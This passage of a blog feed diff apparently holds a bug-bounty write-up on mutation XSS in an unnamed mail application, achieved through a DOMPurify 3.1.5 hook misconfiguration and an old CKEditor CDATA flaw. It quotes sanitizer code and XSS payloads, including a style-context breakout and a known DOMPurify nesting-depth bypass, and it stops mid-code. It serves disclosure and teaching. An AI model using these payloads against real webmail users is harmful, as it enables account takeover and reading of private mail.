@@ -1,5 +1,726 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-30T22:56:49+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">sudi’s blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
-</subtitle><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><entry><title type="html">Abusing the NinjaShell API for Code Execution in Google Web Designer</title><link href="http://localhost:4000/2025/09/23/RCE-in-web-designer.html" rel="alternate" type="text/html" title="Abusing the NinjaShell API for Code Execution in Google Web Designer" /><published>2025-09-23T00:00:00+05:30</published><updated>2025-09-23T00:00:00+05:30</updated><id>http://localhost:4000/2025/09/23/RCE-in-web-designer</id><content type="html" xml:base="http://localhost:4000/2025/09/23/RCE-in-web-designer.html"><![CDATA[<p>Heyyy Everyone,</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-04-09T18:24:39+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">sudi’s blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</subtitle><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><entry><title type="html">Mutation XSS in a Mail Application via DOMPurify Misconfiguration and CKEditor CDATA Parsing Bug</title><link href="http://localhost:4000/2026/04/07/mxss.html" rel="alternate" type="text/html" title="Mutation XSS in a Mail Application via DOMPurify Misconfiguration and CKEditor CDATA Parsing Bug" /><published>2026-04-07T00:00:00+05:30</published><updated>2026-04-07T00:00:00+05:30</updated><id>http://localhost:4000/2026/04/07/mxss</id><content type="html" xml:base="http://localhost:4000/2026/04/07/mxss.html"><![CDATA[<p>Heyy Everyonee,
+I wanted to write about this bug for quite a long time because it’s one of my best xss findings, the time and effort it took to pull this off was immense. Additionally this program doesn’t allow any form of disclosure so sadly there will be no screenshots plus majority of the stuff you will see will be in redacted form.</p>
+
+<p>So where do we even start, I will tell you a little about the target it’s a Mail application similar to Gmail but not really popular I will refer to this target as Redacted Mail. I was able to find a mutation xss bug here, if you have been living under the rocks and not familiar with the term mutation xss I will give a little introduction for that as well in short by sending a crafted mail I could trigger xss in the victim’s browser when they try to view my mail in their inbox. It means with this xss bug I could read all of the victim’s private emails, send any mail to anyone from the victim’s account.</p>
+
+<p>Usually in mail applications you will find they allow you to include html in the mail, this is for proper formatting otherwise all mails would look so ugly in raw text format. Some allow you to include css, hyperlinks and what not but usually all this content gets sanitized it can be either server side or client side or a mix of both. Having them on the client side is beneficial for us because we can look into the source and figure out how the sanitization is happening.</p>
+
+<p>For example Gmail supports the advance markdown formatting and all through AMP</p>
+
+<div class="link-preview">
+  <a href="https://developers.google.com/workspace/gmail/ampemail" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://www.gstatic.com/devrel-devsite/prod/v369eac9380f92e8fedc492e2689927bb3475d758266c381eee326d0b49a77481/developers/images/opengraph/white.png" alt="AMP for Gmail  |  Google for Developers" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">AMP for Gmail  |  Google for Developers</div>
+      
+      <div class="link-preview-domain">developers.google.com</div>
+    </div>
+  </a>
+</div>
+
+<p>It has been targeted in the past and you can find some very cool writeups for these.
+This one from the legend <a href="https://x.com/SecurityMB">Michał Bentkowski</a>. The writeup is already very detailed involves Dom Clobbering to inject arbitrary scripts into the page.</p>
+<div class="link-preview">
+  <a href="https://web.archive.org/web/20250720221337/https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://web.archive.org/web/20250720221337im_/https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png" alt="XSS in GMail's AMP4Email via DOM Clobbering - research.securitum.com" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">XSS in GMail's AMP4Email via DOM Clobbering - research.securitum.com</div>
+      
+      <div class="link-preview-description">This post is a write up of an XSS in AMP4Email (obviously already fixed) I reported via Google Vulnerability Reward Program in August 2019. The XSS is an example of a real-world exploitation of well-known browser issue called DOM Clobbering.</div>
+      
+      <div class="link-preview-domain">web.archive.org</div>
+    </div>
+  </a>
+</div>
+
+<p>Second one is this, which involves an HTML parsing quirk from <a href="https://x.com/agamimaulana">@agamimaulana</a>.</p>
+
+<div class="link-preview">
+  <a href="https://asdqw3.medium.com/xss-in-gmail-dynamic-email-amp-for-email-3872d6052a0d" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://miro.medium.com/v2/resize:fit:617/1*Ye2Tm9CC5eUJfyS8KArAvw.png" alt="XSS in GMAIL Dynamic Email (AMP for Email)" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">XSS in GMAIL Dynamic Email (AMP for Email)</div>
+      
+      <div class="link-preview-description">I found a XSS vulnerability on GMAIL that I reported to Google VRP on January 2023. This issue occurs due to improper HTML parsing in GMAIL…</div>
+      
+      <div class="link-preview-domain">asdqw3.medium.com</div>
+    </div>
+  </a>
+</div>
+
+<p>STYLE tags are very special the content inside of STYLE element is treated as RAW text in HTML namespace no html parsing is done in this context which you can see for the element with id 1. The only way to break the context for a STYLE element is through a closing STYLE element you can see the same example using the element with id 2.</p>
+
+<p><img alt="image" src="/assets/images/mxss/1.png" /></p>
+
+<p><br /></p>
+
+<p>If you are a careful reader in my first sentence I used the word HTML namespace (NS), there are three different NS HTML, MATHML and SVG the parsing rules differ across each NS. For eg STYLE is special because it behaves differently depending on the NS in HTML content inside of STYLE is treated as raw text while in MathML/SVG NS the content inside of STYLE element is treated as normal element not raw text.</p>
+
+<p><img alt="image" src="/assets/images/mxss/2.png" /></p>
+
+<p><br /></p>
+
+<p>You will find amateur sanitizers would often miss this case and treat this as a safe string <code class="language-plaintext highlighter-rouge">&lt;style&gt;&lt;a id="&lt;/style&gt;&lt;img src=x onerror=alert()&gt;"&gt;&lt;/style&gt;</code> , a relaxed parser would see the ANCHOR element while it should have treated it as raw content. As the closing STYLE tag is inside the attribute value and the xss vector too they would often skip it considering it as safe I have seen server side sanitizers usually prone to this assumption.</p>
+
+<p>In the AMP bug found by @agamimaulana, you can see his focus was on bypassing the sanitizer using the STYLE element. Google had some checks in place already to avoid letting users include a closing tag inside of STYLE element context this was allowed <code class="language-plaintext highlighter-rouge">&lt;/style</code> as soon as you added the closing character it would flag it.</p>
+
+<p>An explanation around the STYLE element was necessary because my finding relies upon the same quirk in the Redacted Mail as well.</p>
+
+<hr />
+
+<p>Onto the target now, I started by sending a simple payload to my own email, refreshed the mail and clicked on it</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src=x onerror=alert()&gt;
+</code></pre></div></div>
+
+<p>No popup, wouldn’t be fun if it was that easy right :p. Clicking on the broken image, inspect element I could see the email body content is actually rendered inside a sandbox iframe.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"ext"</span> <span class="na">frameborder=</span><span class="s">"0"</span> <span class="na">src=</span><span class="s">"about:blank"</span> <span class="na">class=</span><span class="s">"preview-iframe"</span> <span class="na">tabindex=</span><span class="s">"0"</span> <span class="na">title=</span><span class="s">"message body"</span> <span class="na">aria-atomic=</span><span class="s">"true"</span> <span class="na">role=</span><span class="s">"document"</span> <span class="na">sandbox=</span><span class="s">"allow-same-origin allow-popups allow-popups-to-escape-sandbox"</span> <span class="na">style=</span><span class="s">"overflow: auto;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>This was an instant bummer the content is actually sanitized so some sanitizer was in use but at the same time they are rendering the content inside sandbox. The values for the sandbox attribute are so limited <code class="language-plaintext highlighter-rouge">allow-same-origin allow-popups allow-popups-to-escape-sandbox</code> you can’t have any xss with this. As it lacks the <code class="language-plaintext highlighter-rouge">allow-scripts</code> directive you can’t execute any type of javascript code inside of it. You can ignore the src attribute value being <code class="language-plaintext highlighter-rouge">about:blank</code> that doesn’t mean it’s of different origin, but the sandbox problem is real and there is no way to break out of it total dead end.</p>
+
+<p>The only way to break sandbox iframe is when you have both <code class="language-plaintext highlighter-rouge">allow-scripts</code> and <code class="language-plaintext highlighter-rouge">allow-same-origin</code> directives which allows you to get a reference to the parent window which is not sandboxed where you can execute any code.</p>
+
+<p>I didn’t want to give up so soon as I was just starting so I decided to look more maybe any other area. I had no hope actually but I noticed something very interesting when you click on the Reply button for any mails, this is what happens.</p>
+
+<p><img alt="image" src="/assets/images/mxss/3.png" /></p>
+
+<p><br /></p>
+
+<p>The original mail content is copied and added at the end of the reply mail you can see clearly how the word <code class="language-plaintext highlighter-rouge">testingggg</code> appeared in the reply mail box. In case of Redacted Mail, the reply content was actually rendered outside of the sandbox iframe. The content was still sanitized but yayy we made some progress as the content was no longer inside the sandbox there was a chance that I could get xss here if I can bypass the sanitizer though it will require the victim to click on the reply option still it seemed promising.</p>
+
+<p>Diving into the source to see how they are sanitizing, when a user clicks on an email, the message body of the email is passed to DOMPurify a state of the art sanitizer, the version used is <code class="language-plaintext highlighter-rouge">3.1.5</code> which was a bit old at that time but can be considered totally safe when used with the default configs. There are some custom hooks defined for DOMPurify as well.
+I mentioned about the reply option where our sanitized content is rendered without sandbox, so after the content is sanitized using DOMPurify it’s passed to Reply preview feature which is using CKEditor. The sanitized html gets parsed again by CKEditor here you can say, for those of you who don’t know CKEditor has its own inbuilt sanitizer which is also strict.</p>
+
+<p>Luckily the used CKEditor version was old which had a known XSS issue, but there was no public poc available this meant I would need to reverse engineer it.</p>
+
+<div class="link-preview">
+  <a href="https://github.com/ckeditor/ckeditor4/security/advisories/GHSA-fq6h-4g8v-qqvm" target="_blank" rel="noopener">
+    <div class="link-preview-content">
+      <div class="link-preview-title">Cross-site scripting (XSS) vulnerability caused by incorrect CDATA detection</div>
+      
+      <div class="link-preview-description">GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.</div>
+      
+      <div class="link-preview-domain">github.com</div>
+    </div>
+  </a>
+</div>
+
+<p>Currently the flow is like this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mail Content
+    |
+    v
+DOMPurify Sanitizer (v3.1.5 + custom hooks)
+    |
+    v
+CKEditor (has its own inbuilt sanitizer)
+    |
+    v
+Rendered in the page
+</code></pre></div></div>
+
+<p>Pulling off a xss in this scenario looked very difficult as DOMPurify is super strict around everything, it will sanitize inputs in all cases. Problem was even if I am able to build the poc for CKEditor how would I deliver the payload so that it reaches untouched to CKEditor renderer because DOMPurify will surely remove any possible chance of xss no matter what the context is it can deal with everything before passing the same to CKEditor renderer. The only possible way to get xss here would be to find a full DOMPurify bypass which allows you to pass any html to the CKEditor renderer.</p>
+
+<p>Earlier I said DOMPurify is very safe you can trust blindly if you are using it with the default configs plus I said that Redacted Mail is using DOMPurify with some custom hooks.
+You might ask what these hooks are</p>
+
+<div class="link-preview">
+  <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://opengraph.githubassets.com/ea3806a4ee6fc3fffbe565b2151d0203e07d824f5adb62e0cdbff8b5d89b2b16/cure53/DOMPurify" alt="GitHub - cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo:" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">GitHub - cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo:</div>
+      
+      <div class="link-preview-description">DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo: - cure53/DOMPurify</div>
+      
+      <div class="link-preview-domain">github.com</div>
+    </div>
+  </a>
+</div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beforeSanitizeElements
+uponSanitizeElement (No 's' - called for every element)
+afterSanitizeElements
+beforeSanitizeAttributes
+uponSanitizeAttribute
+afterSanitizeAttributes
+beforeSanitizeShadowDOM
+uponSanitizeShadowNode
+afterSanitizeShadowDOM
+</code></pre></div></div>
+
+<p>These hooks allow you to make changes to the sanitized elements/attributes for three events before/after/upon you can read more in the documentation to understand them better.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">domPurify</span><span class="p">.</span><span class="nf">addHook</span><span class="p">(</span><span class="dl">"</span><span class="s2">uponSanitizeAttribute</span><span class="dl">"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleAttribute</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="k">this</span><span class="p">)),</span>                                      
+  <span class="nx">domPurify</span><span class="p">.</span><span class="nf">addHook</span><span class="p">(</span><span class="dl">"</span><span class="s2">uponSanitizeElement</span><span class="dl">"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleElement</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="k">this</span><span class="p">)),</span>
+  <span class="nx">domPurify</span><span class="p">.</span><span class="nf">addHook</span><span class="p">(</span><span class="dl">"</span><span class="s2">afterSanitizeAttributes</span><span class="dl">"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">postProcess</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="k">this</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>And the relevant hook method definitions</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">Sanitizer</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">handleAttribute</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if </span><span class="p">(</span><span class="dl">"</span><span class="s2">target</span><span class="dl">"</span> <span class="o">!==</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span> <span class="o">!==</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">)</span> <span class="p">{</span>                                              
+          <span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">editorRegex</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span><span class="p">)</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">editorRegex</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">))</span>
+              <span class="nx">data</span><span class="p">.</span><span class="nx">keepAttr</span> <span class="o">=</span> <span class="o">!</span><span class="mi">1</span><span class="p">;</span>                                                                                   
+          <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="nx">element</span> <span class="k">instanceof</span> <span class="nx">HTMLElement</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">style</span><span class="dl">"</span> <span class="o">===</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">())</span>                     
+              <span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">cssSanitizer</span><span class="p">.</span><span class="nf">sanitizeStyleDeclaration</span><span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">style</span><span class="p">);</span>
+          <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="dl">"</span><span class="s2">href</span><span class="dl">"</span> <span class="o">===</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+              <span class="kd">var</span> <span class="nx">protocol</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span> <span class="o">||</span> <span class="dl">""</span><span class="p">).</span><span class="nf">toLowerCase</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+              <span class="k">if </span><span class="p">([</span><span class="dl">"</span><span class="s2">tel</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">fax</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">sip</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">mailto</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">callto</span><span class="dl">"</span><span class="p">].</span><span class="nf">includes</span><span class="p">(</span><span class="nx">protocol</span><span class="p">))</span>
+                  <span class="k">return</span> <span class="k">void </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">forceKeepAttr</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">)</span>
+          <span class="p">}</span>
+      <span class="p">}</span> <span class="k">else</span>
+          <span class="nx">data</span><span class="p">.</span><span class="nx">forceKeepAttr</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span>
+  <span class="p">},</span>
+  <span class="nx">Sanitizer</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">handleElement</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">_data</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">element</span> <span class="k">instanceof</span> <span class="nx">HTMLStyleElement</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">cssSanitizer</span><span class="p">.</span><span class="nf">sanitizeStyleElement</span><span class="p">(</span><span class="nx">element</span><span class="p">))</span>
+  <span class="p">},</span>
+  <span class="nx">Sanitizer</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">postProcess</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">)</span> <span class="p">{</span>
+      <span class="dl">"</span><span class="s2">target</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">element</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">target</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="p">),</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">linkTitleText</span> <span class="o">&amp;&amp;</span> <span class="nx">element</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">title</span><span class="dl">"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">linkTitleText</span><span class="p">))</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The rule of thumb when you are looking for any mxss vectors is there should be no changes to the sanitized output no matter how small or irrelevant can sometimes devalue the use of the sanitizer by allowing full xss.</p>
+
+<p>From now onwards I am going to talk a lot about DOMPurify internals and MXSS so if you aren’t familiar with the MXSS research or the past DOMPurify bypasses I would highly recommend you to have some solid coverage over those topics otherwise it will be hard to follow up and you won’t be able to understand much.</p>
+
+<div class="link-preview">
+  <a href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes" target="_blank" rel="noopener">
+    <div class="link-preview-content">
+      <div class="link-preview-title">Exploring the DOMPurify library: Bypasses and Fixes (1/2). Tags:Article - Article - Web - mXSS</div>
+      
+      <div class="link-preview-description">Exploring the DOMPurify library: Bypasses and Fixes (1/2)</div>
+      
+      <div class="link-preview-domain">mizu.re</div>
+    </div>
+  </a>
+</div>
+
+<div class="link-preview">
+  <a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations" target="_blank" rel="noopener">
+    <div class="link-preview-content">
+      <div class="link-preview-title">Exploring the DOMPurify library: Hunting for Misconfigurations (2/2). Tags:Article - Article - Web - mXSS</div>
+      
+      <div class="link-preview-description">Exploring the DOMPurify library: Hunting for Misconfigurations (2/2)</div>
+      
+      <div class="link-preview-domain">mizu.re</div>
+    </div>
+  </a>
+</div>
+
+<p>Shout out to <a href="https://x.com/kevin_mizu">Kévin Gervot</a>, I am super grateful to have had him by my side when I was learning about mxss just to reverse engineer the infamous DOMPurify bypasses which came in 2024. He is super talented at the same time very humble as well.</p>
+
+<p>In Mizu’s second blogpost you will find about cases how DOMPurify can also have some misconfigurations which could allow full bypasses. Our target uses uponSanitizeAttribute, uponSanitizeElement and afterSanitizeAttributes so we will search for those only.</p>
+
+<p>In order to fix the maximum nesting depth bypass vector DOMPurify decided to go after the entrypoint which was the sole reason from where all these bypasses were happening. For MXSS vectors you will find that to break the context after a Namespace confusion, researchers would always smuggle the closing tag inside of attribute values. The very simple example of this is</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span><span class="o">&lt;</span><span class="nt">a</span> <span class="nt">id</span><span class="o">=</span><span class="err">"</span><span class="nt">&lt;/style&gt;&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>"&gt;<span class="nt">&lt;/style&gt;</span>
+</code></pre></div></div>
+
+<p>Inside the <a href="https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1383"><code class="language-plaintext highlighter-rouge">_sanitizeAttributes</code></a> method of DOMPurify which is responsible for sanitizing attributes and their values. This check was added</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="cm">/* Work around a security issue with comments inside attributes */</span>
+      <span class="k">if </span><span class="p">(</span>
+        <span class="nx">SAFE_FOR_XML</span> <span class="o">&amp;&amp;</span>
+        <span class="nf">regExpTest</span><span class="p">(</span>
+          <span class="sr">/</span><span class="se">((</span><span class="sr">--!</span><span class="se">?</span><span class="sr">|]</span><span class="se">)</span><span class="sr">&gt;</span><span class="se">)</span><span class="sr">|&lt;</span><span class="se">\/(</span><span class="sr">style|script|title|xmp|textarea|noscript|iframe|noembed|noframes</span><span class="se">)</span><span class="sr">/i</span><span class="p">,</span>
+          <span class="nx">value</span>
+        <span class="p">)</span>
+      <span class="p">)</span> <span class="p">{</span>
+        <span class="nf">_removeAttribute</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">currentNode</span><span class="p">);</span>
+        <span class="k">continue</span><span class="p">;</span>
+      <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The default value for <code class="language-plaintext highlighter-rouge">SAFE_FOR_XML</code> is true and it uses a regex based check for the attribute value this is to ensure there is no closing tag of those elements. All these tags have some special context like STYLE and could be abused to take advantage of any NS confusion attack.
+So this fix single handedly ensures no more MXSS could be there.</p>
+
+<p>From Mizu’s blogpost you can find the full poc for the DOMPurify bypasses and you could notice how the closing style tag is placed inside the attribute value.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;r</span><span class="na">*503</span><span class="nt">&gt;</span>
+<span class="nt">&lt;a&gt;&lt;svg&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;a&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;/image&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/a&gt;&lt;/image&gt;</span>
+<span class="nt">&lt;style&gt;</span><span class="o">&lt;</span><span class="nt">a</span> <span class="nt">id</span><span class="o">=</span><span class="err">"</span><span class="nt">&lt;/style&gt;&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>"&gt;<span class="nt">&lt;/a&gt;&lt;/style&gt;</span>
+<span class="nt">&lt;/svg&gt;&lt;/desc&gt;&lt;/svg&gt;&lt;/a&gt;</span>
+</code></pre></div></div>
+
+<p>The creator behind DOMPurify can be considered the god of XSS <a href="https://cure53.de/">Dr.-Ing. Mario Heiderich</a>, if you aren’t familiar with his work would definitely recommend to check out all of his past researches and talks super insightful if you are someone who loves client side stuff and browsers.</p>
+
+<p>In DOMPurify version 3.1.5, there was a quirk related to the <code class="language-plaintext highlighter-rouge">uponSanitizeAttribute</code> hook in conjunction with the <code class="language-plaintext highlighter-rouge">forceKeepAttr</code> of the callback hook event.</p>
+
+<p><img alt="image" src="/assets/images/mxss/4.png" /></p>
+
+<p><br /></p>
+
+<p>In the example code you can see <code class="language-plaintext highlighter-rouge">currentNode.nodeName.toUpperCase()</code> if the value of this is <code class="language-plaintext highlighter-rouge">A</code> (meaning it’s an anchor tag) and the attribute name which is going to be sanitized is equal to <code class="language-plaintext highlighter-rouge">data-x</code>, the <code class="language-plaintext highlighter-rouge">hookEvent.forceKeepAttr</code> property is set to true.</p>
+
+<p>Now let’s see what happens in DOMPurify code when it sees the <code class="language-plaintext highlighter-rouge">hookEvent.forceKeepAttr</code> as true, it simply calls the continue statement??</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">_executeHook</span><span class="p">(</span><span class="dl">'</span><span class="s1">uponSanitizeAttribute</span><span class="dl">'</span><span class="p">,</span> <span class="nx">currentNode</span><span class="p">,</span> <span class="nx">hookEvent</span><span class="p">);</span>
+<span class="nx">value</span> <span class="o">=</span> <span class="nx">hookEvent</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">;</span>
+<span class="cm">/* Did the hooks approve of the attribute? */</span>
+<span class="k">if </span><span class="p">(</span><span class="nx">hookEvent</span><span class="p">.</span><span class="nx">forceKeepAttr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// [...]</span>
+
+<span class="cm">/* Work around a security issue with comments inside attributes */</span>
+<span class="k">if </span><span class="p">(</span><span class="nx">SAFE_FOR_XML</span> <span class="o">&amp;&amp;</span> <span class="nf">regExpTest</span><span class="p">(</span><span class="sr">/</span><span class="se">((</span><span class="sr">--!</span><span class="se">?</span><span class="sr">|]</span><span class="se">)</span><span class="sr">&gt;</span><span class="se">)</span><span class="sr">|&lt;</span><span class="se">\/(</span><span class="sr">style|title</span><span class="se">)</span><span class="sr">/i</span><span class="p">,</span> <span class="nx">value</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nf">_removeAttribute</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">currentNode</span><span class="p">);</span>
+    <span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>In this scenario the safety checks are completely skipped, reviving the old bypasses again. Actually DOMPurify implemented fixes around Nesting depth as well which was the core quirk of the browser which allowed all these bypasses but Mizu along with some other client side legends were finding bypasses here and there, this is the same story whenever there is a new type of DOMPurify bypass you will see many more similar variants. At last after playing a game of cat and mouse, a proper fix was to kill the chain itself using that regex check and the previously added nested depth checks were removed in later versions.</p>
+
+<p>As a fix for this, the if condition check for <code class="language-plaintext highlighter-rouge">hookEvent.forceKeepAttr</code> is now placed after the regex check.</p>
+
+<p>In our target it had the same misconfiguration and super luckily the version used here was <code class="language-plaintext highlighter-rouge">3.1.5</code>, this was a moment to shine.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">Sanitizer</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">handleAttribute</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if </span><span class="p">(</span><span class="dl">"</span><span class="s2">target</span><span class="dl">"</span> <span class="o">!==</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span> <span class="o">!==</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">)</span> <span class="p">{</span>                                              
+          <span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">editorRegex</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span><span class="p">)</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">editorRegex</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">))</span>
